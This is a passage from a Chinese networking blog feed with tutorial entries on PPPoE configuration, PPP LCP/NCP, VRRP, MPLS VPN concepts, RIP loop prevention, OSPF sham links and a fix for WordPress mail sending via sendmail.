        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/handbye/images/master/20190224214246.png"></p><p><strong>客户端：</strong></p><pre class="line-numbers language-none"><code class="language-none">dialer-ruledialer-rule 1 ip permit#ip route-static 0.0.0.0 0.0.0.0 Dialer1interface Dialer1link-protocol pppppp chap user ******ppp chap password cipher ******ip address ppp-negotiatedialer user hciedialer bundle 1dialer-group 1#interface GigabitEthernet0&#x2F;0&#x2F;1pppoe-client dial-bundle-number 1 on-demand#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>服务器端：</strong></p><pre class="line-numbers language-none"><code class="language-none">#ip pool pppoepoolgateway-list 10.1.12.254network 10.1.12.0 mask 255.255.255.0#aaalocal-user **** password cipher ****local-user hcie service-type ppp##interface Virtual-Template1ppp authentication-mode chapremote address pool pppoepoolip address 10.1.12.2 255.255.255.0#interface GigabitEthernet0&#x2F;0&#x2F;0pppoe-server bind Virtual-Template 1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PPPoE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPP协议中的两个组件LCP和NCP</title>
      <link href="2016/12/06/PPP-LCP-NCP/"/>
      <url>2016/12/06/PPP-LCP-NCP/</url>
      
        <content type="html"><![CDATA[<p>ppp是一个协议族，其中包含了两个协议：LCP（link control protocol）和NCP（network control protocol）两个协议，也称为ppp的两个组件。</p><img src="https://i.loli.net/2018/03/26/5ab8ee99e3d19.png" alt="pppzujian.png" title="pppzujian.png" /><p>链路控制协议LinkControlProtocol用来建立、拆除和监控PPP数据链路</p><p>网络层控制协议NetworkControlProtocol用于对不同的网络层协议进行连接建立和参数协商</p><p>为了能适应多种多样的链路类型，（这里指的是物理层链路类型）PPP定义了链路控制协议LCP。LCP可以自动检测链路环境，如是否存在环路，协商链路参数，如最大数据包长度，使用何种认证协议等等。与其他数据链路层协议相比，PPP协议的一个重要特点是可以提供认证功能，链路两端可以协商使用何种认证协议来实施认证过程，只有认证成功之后才会建立连接。</p><p>PPP定义了一组网络层控制协议NCP，每一个NCP对应了一种网络层协议，用于协商网络层地址等参数，例如IPCP用于协商控制IP协议，IPXCP用于协商控制IPX协议等。</p><p><strong>报文</strong></p><img src="https://i.loli.net/2018/03/26/5ab8eee03d617.png" alt="lcp.png" title="lcp.png" /><ol><li>Configure-Request（配置请求）：链路层协商过程中发送的第一个报文，该报文表明点对点双方开始进行链路层参数的协商。</li><li>Configure-Ack（配置响应）：收到对端发来的Configure-Request报文，如果参数取值完全接受，则以此报文响应。</li><li>Configure-Nak（配置不响应）：收到对端发来的Configure-Request报文，如果参数取值不被本端认可，则发送此报文并且携带本端可接受的配置参数。</li><li>Configure-Reject（配置拒绝）：收到对端发来的Configure-Request报文，如果本端不能识别对端发送的Configure-Request中的某些参数，则发送此报文并且携带那些本端不能认别的配置参数。</li></ol><p><strong>LCP协商参数</strong></p><img src="https://i.loli.net/2018/03/26/5ab8ef4a3992d.png" alt="lcpsanchu.png" title="lcpsanchu.png" /><p><strong>NCP（IPCP协商过程）</strong></p><p>IPCP使用和LCP相同的协商机制、报文类型，但IPCP并非调用LCP，只是工作过程、报文等和LCP相同。</p><p>IP地址协商包括两种方式：静态配置协商和动态配置协商。</p><p>静态协商是指ppp两端都配置了IP地址，此时要用静态协商，如果使用ppp客户端和服务器的模式此时要用动态协商。</p><p><strong>静态协商过程：</strong></p><img src="https://i.loli.net/2018/03/26/5ab8ef9287cd8.png" alt="ipcpjingtai.png" title="ipcpjingtai.png" /><p>静态IP地址的协商过程如下：</p><ol><li>每一端都要发送Configure-Request报文，在此报文中包含本地配置的地址；</li><li>每一端接收到此Configure-Request报文之后，检查其中的IP地址，如果IP地址是一个合法的单播IP地址，而且和本地配置的IP地址不同（没有IP冲突），则认为对端可以使用该地址，回应一个Configure-Ack报文。</li></ol><p><strong>动态协商过程：</strong></p><p>两端动态协商IP地址的过程如下：</p><ol><li>RTA向RTB发送一个Configure-Request报文，此报文中会包含一个IP地址0.0.0.0，表示向对端请求IP地址;</li><li>RTB收到上述Configure-Request报文后，认为其中包含的地址（0.0.0.0）不合法，使用Configure-Nak回应一个新的IP地址10.1.1.1（此ip地址是从服务器端的地址中随机拿出的）;</li><li>RTA收到此Configure-Nak报文之后，更新本地IP地址，并重新发送一个Configure-Request报文，包含新的IP地址10.1.1.1；</li><li>RTB收到Configure-Request报文后，认为其中包含的IP地址为合法地址，回应一个Configure-Ack报文。</li><li>同时，RTB也要向RTA发送Configure-Request报文请求使用地址10.1.1.2，RTA认为此地址合法，回应Configure-Ack报文。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LCP </tag>
            
            <tag> NCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPPoE会话建立过程</title>
      <link href="2016/12/05/PPPoE-session/"/>
      <url>2016/12/05/PPPoE-session/</url>
      
        <content type="html"><![CDATA[<img src="https://i.loli.net/2018/03/26/5ab8edb3aa4cc.png" alt="pppoehuihuajianli.png" title="pppoehuihuajianli.png" /><p>1.用户客户端向服务器发送一个PADI报文，开始PPPOE接入。</p><p>2.服务器向客户端发送PADO报文。</p><p>3.客户端根据回应，发起PADR请求给服务器。</p><p>4.服务器产生一个Session ID，通过PADS发给客户端。</p><p>5.客户端和服务器之间进行PPP的LCP协商，建立链路层通信。同时，协商使用CHAP认证方式。</p><p>6.服务器通过Challenge报文发送给认证客户端，提供一个128bit的Challenge。</p><p>7.客户端收到Challenge报文后，并将密码和Challenge做MD5算法运算后，在Response回应报文中把结果发送给服务器。</p><p>8.服务器根据用户发送的信息判断用户是否合法，然后回应认证成功/失败报文，将认证结果返回给客户端。</p><p>9.进行NCP（如IPCP）协商，通过服务器获取到规划的IP地址等参数。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>串行链路的传输方式</title>
      <link href="2016/12/04/seial-link-transmission-mode/"/>
      <url>2016/12/04/seial-link-transmission-mode/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/eb8b3905gy1fhkf54jg84j20mr0f90uj.jpg"></p><h2 id="异步传输方式："><a href="#异步传输方式：" class="headerlink" title="异步传输方式："></a>异步传输方式：</h2><p>串行链路的帧开始和结束都有一个字段为7E代表一个帧的开始和结束。发送端发送的帧可以是乱序的，当对端收到这个帧时是可以根据字段来判断此帧是一个起始帧还是结束帧，这种传输方式成为异步传输。</p><h2 id="同步传输方式："><a href="#同步传输方式：" class="headerlink" title="同步传输方式："></a>同步传输方式：</h2><p>同步传输方式是根据时钟来同步的，也就是在某一时刻发送端会发送一个帧，而接受端和发送端的时钟是同步的，接收端会记录此时刻，在收到发送端发送的所有帧时，按时刻来组装这些帧即可，也不会造成乱序。</p><p>DCE即数据通信设备，它提供了一个用于同步DCE设备和DTE设备之间数据传输的时钟信号。DTE即数据终端设备，它通常使用DCE产生的时钟信号。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 链路层 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vrrp备份组</title>
      <link href="2016/12/02/vrrp-backup-group/"/>
      <url>2016/12/02/vrrp-backup-group/</url>
      
        <content type="html"><![CDATA[<p> vrrp将域中的一组路由器划分到一起称为一个备份组。既然是备份组，那么这个组中最少需要两台路由器，一台作为master另一台作为slaver。理论上最多可以有无限台路由器，但只能有一台master，其余的全部为slaver。</p><p>这个备份组中的路由器组成一个虚拟路由器。</p><p><strong>vrrp备份组特点：</strong></p><p>虚拟路由器具有 IP 地址，称为虚拟IP 地址。局域网内的主机仅需要知道这个虚拟路由器的IP地址，并将其设置为缺省路由的下一跳地址。</p><p>网络内的主机通过这个虚拟路由器与外部网络进行通信。<br>备份组内的路由器根据优先级，选举出Master 路由器，承担网关功能。其他路由器作为Backup路由器，当Master 路由器发生故障时，取代Master 继续履行网关职责，从而保证网络内的主机不间断地与外部网络进行通信。</p><p>vrrp组网示意图：</p><img src="https://i.loli.net/2018/03/26/5ab8eb557b67f.png" alt="vrrpzuwang.png" title="vrrpzuwang.png" /><p><strong>vrrp备份组特性：</strong></p><p>1.vrrp备份组中的每台路由器都有一个优先级，vrrp备份组就是根据这个优先级来确定谁是master谁是slaver的。优先级取值范围为0-255，数值越大，优先级越高。（注意：255是最高优先级，当一个备份组中有多台路由器时，拥有IP地址的路由器优先级就为255）<br>2.vrrp备份组中的路由器工作模式分为抢占模式和非抢占模式两种模式。</p><ul><li>非抢占方式：如果备份组中的路由器工作在非抢占方式下，则只要Master 路由器没有出现故障，Backup 路由器即使随后被配置了更高的优先级也不会成为Master 路由器。</li><li>抢占方式：如果备份组中的路由器工作在抢占方式下，它一旦发现自己的优先级比当前的Master 路由器的优先级高，就会对外发送VRRP 通告报文。导致备份组内路由器重新选举Master 路由器，并最终取代原有的Master 路由器。相应地，原来的Master 路由器将会变成Backup 路由器。</li></ul><p>3.vrrp有两种认证模式：simple 简单字符认证 和MD5 认证 ，采取认证的主要原因是：防止非法用户构造报文攻击备份组，伪造master路由器。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 三层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vrrp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VRRP简介</title>
      <link href="2016/11/29/VRRP-VRRP-intro/"/>
      <url>2016/11/29/VRRP-VRRP-intro/</url>
      
        <content type="html"><![CDATA[<h2 id="了解传统的局域网组网方案"><a href="#了解传统的局域网组网方案" class="headerlink" title="了解传统的局域网组网方案:"></a>了解传统的局域网组网方案:</h2><img src="https://i.loli.net/2018/03/26/5ab8ea519bfba.png" alt="juyu1.png" title="juyu1.png" /><p>传统的局域网组网一般是将多台内部pc的取胜网关设为同一个出口路由器的IP地址。这样会造成一个问题那就是一旦这台出口路由器因为某些原因无法工作时，所有内部的pc将无法连接到外网。这样的设计虽然简单，但几乎没有什么可靠性，对于一些重要数据流无法得到保证。</p><p>这时有一种办法来解决这种问题，那就是设置多台出口路由器互为备份，将pc的网关分别设为这些出口网关路由器的IP地址，一旦当一个路由器出现故障后，内网中的pc可以用另一台的出口路由器连接到外网。</p><p>上述方法看似可行，因为这种方法对于一些对于延时要求较低，不是那么重要的数据确实不失为一种方法。为什么说这种方案的收敛时间较慢呢，因为我们的现实组网不可能这么简单，一定会用到一些路由协议如：ospf bgp 等，而这些路由器的收敛时间都是按秒计算的，在收敛时间内一些数据会丢失。</p><p>VRRP技术正是用来解决这一问题。</p><h2 id="什么是VRRP"><a href="#什么是VRRP" class="headerlink" title="什么是VRRP"></a>什么是VRRP</h2><ul><li><p>VRRP（Virtual Router Redundancy Protocol，虚拟路由器冗余协议）将可以承担网关功能的一组路由器加入到备份组中，形成一台虚拟路由器，由VRRP 的选举机制决定哪台路由器承担转发任务，局域网内的主机只需将虚拟路由器配置为缺省网关。</p></li><li><p>VRRP 是一种容错协议，在提高可靠性的同时，简化了主机的配置。在具有多播或广播能力的局域网（如以太网）中，借助VRRP 能在某台路由器出现故障时仍然提供高可靠的缺省链路，有效避免单一链路发生故障后网络中断的问题，而无需修改动态路由协议、路由发现协议等配置信息。</p></li><li><p>VRRP 协议的实现有VRRPv2 和VRRPv3 两个版本。其中，VRRPv2 基于IPv4，VRRPv3 基于IPv6。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 三层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vrrp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MPLS-VPN中RD/RT/VRF</title>
      <link href="2016/11/26/MPLS-VPN-RD-RT-VRF/"/>
      <url>2016/11/26/MPLS-VPN-RD-RT-VRF/</url>
      
        <content type="html"><![CDATA[<p><strong>RD (Route Distinguisher)：</strong></p><ol><li>用于标识PE上不同VPN实例，其主要作用是实现VPN实例之间地址复用，与IP地址一起构成12 Bytes的VPNv4地址。</li><li>RD与路由一起被携带在BGP Update报文中发送给对端。</li><li>RD不具有选路能力，不影响路由的发送与接受。</li><li>RD用来区分本地VRF，本地有效。</li></ol><p><strong>RT (Route Target)：</strong></p><ol><li>RT是VPNv4路由携带的一个重要属性，它决定VPN路由的收发和过滤，PE依靠RT属性区分不同VPN之间路由。</li><li>当从VRF表中导出VPN路由时，要用Export RT对VPN路由进行标记。</li><li>当往VRF表中导入VPN路由时，只有所带RT标记与VRF表中任意一个Import RT相符的路由才会被导入到VRF表中。</li></ol><p><strong>什么是VRF呢？</strong></p><p>VRF：Virtual Routing and Forwarding，翻译成虚拟路由及转发，它是一种VPN路由和转发实例。一台PE路由器，由于可能同时连接了多个VPN用户，这些用户（的路由）彼此之间需要相互隔离，那么这时候就用到了VRF，PE路由器上每一个VPN都有一个VRF。PE路由器除了维护全局IP路由表之外，还为每个VRF维护一张独立的IP路由表，这张路由表称为VRF路由表。</p><p>要注意的是全局IP路由表，以及VRF路由表都是相互独立或者说相互隔离的。 一旦在PE路由器上创建了一个VRF，我们就可以将特定的接口（物理或逻辑的）放入这个VRF，那么这个接口将不再属于全局IP路由表或其他任何VRF，只为该VRF服务。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> MPLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mpls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RIP防环机制</title>
      <link href="2016/11/25/RIP-prevent-ring/"/>
      <url>2016/11/25/RIP-prevent-ring/</url>
      
        <content type="html"><![CDATA[<p>环路的产生:</p><img src="https://i.loli.net/2018/03/26/5ab8e7b767941.png" alt="RIP-LOOP.png" title="RIP-LOOP.png" /><p>如果没有防环机制，RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送度量值为2的通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络。此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><p><strong>环路避免一水平分割</strong></p><p>水平分割的原理是，路由器从某个接口学习到的路由，不会再从该接口发出去。</p><img src="https://i.loli.net/2018/03/26/5ab8e82ce9753.png" alt="shuiping.png" title="shuiping.png" /><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p><p><strong>环路避免—毒性反转</strong></p><img src="https://i.loli.net/2018/03/26/5ab8e8ebe8bf9.png" alt="duxing.png" title="duxing.png" /><p>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器。</p><p>RTB向RTA通告了度量值为1的10.0.0.0/8路由，RTA在通告给RTB时将该路由度量值设为16。如果10.0.0.0/8网络发生故障，RTB便不会认为可以通过RTA到达10.0.0.0/8网络，因此就可以避免路由环路的产生。</p><p><strong>环路避免—触发更新</strong></p><p>触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文。</p><img src="https://i.loli.net/2018/03/26/5ab8e8a39cde3.png" alt="chufa.png" title="chufa.png" /><p>缺省情况下，一台RIP路由器每30秒会发送一次路由表更新给邻居路由器。</p><p>当本地路由信息发生变化时，触发更新功能允许路由器立即发送触发更新报文给邻居路由器，来通知路由信息更新，而不需要等待更新定时器超时，从而加速了网络收敛。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RIPV1和RIPV2兼容性</title>
      <link href="2016/11/24/RIPV1-RIPV2-compatibility/"/>
      <url>2016/11/24/RIPV1-RIPV2-compatibility/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2018/03/26/5ab8e61c45820.png" alt="RIPV2.png"></p><p>RIPV2中有个字段Unused</p><p>如果运行了RIPV2协议的路由器收到了更新报文的版本字段指出RIP的版本为1,但所有未使用的字段(UNUSED FIELD)的所有位都被设置为1,那么这个更新报文将被丢弃;</p><p>如果版本改字段设置大于1,此路由器收到的RIPV1报文中定义为未使用的字段将被忽略,并且处理这个消息。</p><p>结果,像RIP V2协议这样新版本的协议就可以向后兼容RIP-V1.</p><p>＂兼容性开关＂,用来允许版本1和版本2之间的互操作:</p><p>RIP-1——只有RIPV1的消息传送:<br>RIP-1兼容性——使RIPV2使用广播方式代替组播方式来通告消息,以便RIPV1可以接收它们;</p><p>RIP-2——RIP V2协议使用组播方式通告消息到目的地址224.0.0.9</p><p>NONE——不发送消息</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ripv1和Ripv2的不同以及报文结构对比</title>
      <link href="2016/11/24/ripv1-ripv2-diff/"/>
      <url>2016/11/24/ripv1-ripv2-diff/</url>
      
        <content type="html"><![CDATA[<h3 id="RIP路由协议简介："><a href="#RIP路由协议简介：" class="headerlink" title="RIP路由协议简介："></a>RIP路由协议简介：</h3><p>RIP（路由信息协议）是一种距离矢量的路由协协议，距离：是指其使用跳数来作为路由的cost值，矢量：代表其传递路由时是有方向性的。</p><p>由于RIP协议的配置简单，易于维护而得到广泛的应用吗，但又因其最大支持15跳的原因只能应用于较小规模的网络中。</p><h3 id="RIP两个版本的区别："><a href="#RIP两个版本的区别：" class="headerlink" title="RIP两个版本的区别："></a>RIP两个版本的区别：</h3><p>RIP现有两个版本：RIPV1和RIPV2。两版本最主要的区域如下：</p><p><strong>RIPv1：</strong></p><ul><li>有类别路由协议，不支持VLSM和CIDR。</li><li>以广播的形式发送报文。</li><li>不支持认证。</li></ul><p><strong>RIPv2：</strong></p><ul><li>无类别路由协议，支持VLSM，支持路由聚合与CIDR。</li><li>支持以广播或者组播（224.0.0.9）方式发送报文。</li><li>支持明文认证和MD5密文认证。</li></ul><h3 id="RIP报文结构："><a href="#RIP报文结构：" class="headerlink" title="RIP报文结构："></a>RIP报文结构：</h3><p>今天主要来比较RIPV1和RIPv2的报文结构：</p><h4 id="RIPV1报文："><a href="#RIPV1报文：" class="headerlink" title="RIPV1报文："></a>RIPV1报文：</h4><p><img src="https://i.loli.net/2018/03/26/5ab8e738cf618.png" alt="RIPV1.png"></p><h4 id="RIPV2报文："><a href="#RIPV2报文：" class="headerlink" title="RIPV2报文："></a>RIPV2报文：</h4><p><img src="https://i.loli.net/2018/03/26/5ab8e61c45820.png" alt="RIPV2.png"></p><p>其实RIPV1和RIPV2的不同之处已经表现在报文内容中。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ospf shamlink 初认识</title>
      <link href="2016/11/22/ospf-shamlink-learn/"/>
      <url>2016/11/22/ospf-shamlink-learn/</url>
      
        <content type="html"><![CDATA[<h2 id="ospf-shamlink-是应用在MPLS-VPN中的一种灵活组网方式。"><a href="#ospf-shamlink-是应用在MPLS-VPN中的一种灵活组网方式。" class="headerlink" title="ospf shamlink 是应用在MPLS VPN中的一种灵活组网方式。"></a>ospf shamlink 是应用在MPLS VPN中的一种灵活组网方式。</h2><p>ospf shamlink 中实现了可以两个CE设备或用户站点间设计一条back door 链路。当运营商网络中出现问题后可以立马切换到后门备份链路，防止了重要业务和流量的中断。</p><p>shamlink的简单应用场景：</p><p><img src="https://i.loli.net/2018/03/26/5ab8e098a0a06.png" alt="shamlink-1-768x493.png"></p><p>PE1和PE2用MPLS vpn建立bgp vpnv4邻居。运营商内部使用ospf传递路由。</p><p>site1和site2中也使用ospf传递路由</p><p>CE1和CE2之间存在后门链路，两台CE设备使用loopback地址建立ospf shamlink</p><p>一方面两个site站点间可以通过MPLSvpn传递路由，另一方面可以通过后门链路传递路由。但由于通过后门链路学到的路由cost值更小，所以会优选后门链路。而shamlink的作用就是抑制ospf路由而使bgpvpnv4路由生效。</p><p><strong>在sham link通过下面实现方式来屏蔽ospf路由:</strong></p><p>在PE的ospf多实例路由计算完成后，过滤掉所有下一跳为sham link的ospf路由，这样PE上学到对端CE的私网路由就是通过BGP了（通过cost值小优选sham link链路，避免PE直接从本端CE到对端CE，然后又过滤掉下一跳为sham link的ospf路由，使得bgp vpnv4路由生效）。</p><h2 id="shamlink配置步骤："><a href="#shamlink配置步骤：" class="headerlink" title="shamlink配置步骤："></a>shamlink配置步骤：</h2><p>1.环回口绑定vpn实例。</p><p>2.在BGP vpn 实例中宣告环回口，保证环回口路由可以通过bgp vpnv4传递。</p><p>3.在ospf下建立shamlink。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shamlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见应用层协议总结</title>
      <link href="2016/11/21/application-layer-protol-summary/"/>
      <url>2016/11/21/application-layer-protol-summary/</url>
      
        <content type="html"><![CDATA[<p>应用层是OSI七层模型的最高层（附OSI七层模型：）</p><ul><li>Layer 7：应用层（Application Layer）</li><li>Layer 6：表示层（Presentation Layer）</li><li>Layer 5：会话层（Session Layer）</li><li>Layer 4：传输层（Transport Layer）</li><li>Layer 3：网络层（Network Layer）</li><li>Layer 2：数据链路层（Data Link Layer）</li><li>Layer 1：物理层（Physical Layer）</li></ul><blockquote><p>应用层和应用接口结合为用户提供常见的应用服务，我认为的应用层就是为各种应用提供接口和协议，来供各种应用接入网络。然后通过数据的封装形式，一层一层向下传递直到物理层，然后转换为比特流在传输介质上进行传输。</p></blockquote><p>常见应用层协议图解：<br><img src="https://i.loli.net/2017/12/22/5a3d28204cb77.png" alt="2017-07-15131632.png"></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 应用层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用层协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>完美解决wordpress站点无法发送邮件的问题</title>
      <link href="2016/11/19/slove-wordpress-can&#39;t-send-email/"/>
      <url>2016/11/19/slove-wordpress-can&#39;t-send-email/</url>
      
        <content type="html"><![CDATA[<p>最近计划重新整改站点，一直有个问题困扰，那就是网站无法发送邮件，这样新用户就无法注册，自己也无法找回密码。</p><p>安装了WP email SMTP插件，虽然测试邮件可以发送成功。但注册时也无法发送邮件。</p><p>下面我为大家介绍解决办法：</p><p>1.首先测试自己的服务器或主机是否支持mail函数。测试代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"支持mail()函数！"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不支持mail()函数！"</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.如果测试为支持，但仍然无法发送邮件，请打开php.ini修改如下配置：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span>mail <span class="token keyword">function</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">For</span> Win32 only<span class="token operator">.</span><span class="token punctuation">;</span> <span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//php.net/smtp</span><span class="token constant">SMTP</span> <span class="token operator">=</span> localhost<span class="token punctuation">;</span> <span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//php.net/smtp-port</span>smtp_port <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span> <span class="token keyword">For</span> Win32 only<span class="token operator">.</span><span class="token punctuation">;</span> <span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//php.net/sendmail-from</span>sendmail_from <span class="token operator">=</span> x<span class="token operator">.</span>x<span class="token operator">.</span>x<span class="token operator">.</span>x@yy<span class="token operator">.</span><span class="token function">com </span><span class="token punctuation">(</span>此项为你发送的邮箱<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">For</span> Unix only<span class="token operator">.</span> You may supply arguments <span class="token keyword">as</span> <span class="token function">well </span><span class="token punctuation">(</span><span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"sendmail -t -i"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">;</span> <span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//php.net/sendmail-path</span>sendmail_path <span class="token operator">=</span><span class="token string double-quoted-string">"c:/sendmail/sendmail.exe -t -i"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sendmail见如下分享：</p><p><a href="http://pan.baidu.com/s/1c2FrcC4">http://pan.baidu.com/s/1c2FrcC4</a></p><p>将此文件上传到服务器。</p><p>然后打开sendmail.ini.进行如下配置：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span>sendmail<span class="token punctuation">]</span><span class="token punctuation">;</span> you must change mail<span class="token operator">.</span>mydomain<span class="token operator">.</span>com to your smtp serversmtp_server<span class="token operator">=</span>smtp<span class="token operator">.</span><span class="token number">163.</span>com （此项为自己的邮件<span class="token constant">SMTP</span>地址）smtp_port<span class="token operator">=</span><span class="token number">25</span>smtp_ssl<span class="token operator">=</span>auto<span class="token punctuation">;</span> the <span class="token keyword">default</span> domain <span class="token keyword">for</span> this server will be read from the registry<span class="token punctuation">;</span> this will be appended to email addresses when one isn<span class="token string single-quoted-string">'t provided; if you want to override the value in the registry, uncomment and modify;default_domain=mydomain.com; log smtp errors to error.log (defaults to same directory as sendmail.exe); uncomment to enable loggingerror_logfile=error.log; create debug log as debug.log (defaults to same directory as sendmail.exe); uncomment to enable debuggingdebug_logfile=debug.log; if your smtp server requires authentication, modify the following two linesauth_username=X.X.X.@163.com (邮件用户名)auth_password=* （邮件密码）; if your smtp server uses pop3 before smtp authentication, modify the; following three lines;pop3_server=;pop3_username=;pop3_password=; to force the sender to always be the following email address, uncomment and; populate with a valid email address. this will only affect the "MAIL FROM"; command, it won'</span>t modify the <span class="token string double-quoted-string">"From: "</span> header of the message contentforce_sender<span class="token operator">=</span><span class="token constant">X</span><span class="token operator">.</span><span class="token constant">X</span><span class="token operator">.</span><span class="token constant">X</span><span class="token operator">.</span><span class="token constant">X</span>@<span class="token number">163.</span>com （邮件地址）<span class="token punctuation">;</span> sendmail will <span class="token keyword">use</span> <span class="token package">your</span> hostname <span class="token keyword">and</span> your default_domain in the ehlo<span class="token operator">/</span>helo<span class="token punctuation">;</span> smtp greeting<span class="token operator">.</span> you can manually set the ehlo<span class="token operator">/</span>helo name <span class="token keyword">if</span> required<span class="token punctuation">;</span>hostname<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置完上述文件后，重启网站应该即可解决。</p><p>注意有的主题可能不支持邮件的发送，建议更换。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> bug解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈RSTP的快速收敛机制 P/A机制</title>
      <link href="2016/11/19/RSTP-PA-mode/"/>
      <url>2016/11/19/RSTP-PA-mode/</url>
      
